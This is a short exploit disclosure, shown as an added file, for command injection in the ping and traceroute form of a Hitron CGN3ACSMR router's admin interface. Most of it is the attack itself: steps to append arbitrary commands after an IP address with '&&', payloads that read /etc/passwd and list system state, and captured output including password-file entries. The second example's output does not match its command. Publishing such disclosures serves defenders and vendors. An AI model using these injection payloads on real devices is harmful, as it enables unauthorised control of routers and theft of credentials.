@@ -1,0 +1,45 @@
+# Exploit title: Hitron Router (CGN3ACSMR) - Remote Code Execution 
+# Author: Dolev Farhi (dolevf at protonmail.ch)
+# Date: 29-10-2015
+# Vendor homepage: http://www.hitrontech.com/en/index.php
+# Software version: 4.5.8.16
+# Hardware version: 1A
+
+# Details:
+Hitron routers provide an interface to test connectivity (ping, tracert) via the graphical user interface of the router (Management UI).
+This interface is vulnerable to code injection using the && argument after the IP address.
+
+# Steps to reproduce:
+1. Navigate to the dashboard
+2. Navigate to the admin tab
+3. Type an ip address in the Destination form
+4. append any code you want after the ip.
+
+Example one: 
+8.8.8.8 && cat /etc/passwd
+
+Result
+
+root:$1$27272727:0:0::/:/bin/false
+nobody:$1$27272727:65535:65535::/:/bin/false
+rogcesadmin:filtered/:100:100::/:/usr/sbin/cli
+=============Complete==============
+
+
+
+Example two:
+8.8.8.8 && ip a 
+PID USER VSZ STAT COMMAND
+1 root 1268 S init
+2 root 0 SW [kthreadd]
+3 root 0 SW [ksoftirqd/0]
+5 root 0 SW [kworker/u:0]
+6 root 0 SW< [khelper]
+7 root 0 SW [irq/74-hw_mutex]
+8 root 0 SW [sync_supers]
+9 root 0 SW [bdi-default]
+10 root 0 SW< [kblockd]
+11 root 0 SW< [gPunitWorkqueue]
+12 root 0 SW [irq/79-punit_in]
+13 root 0 SW [kswapd0]
+14 root 0 SW< [crypto]
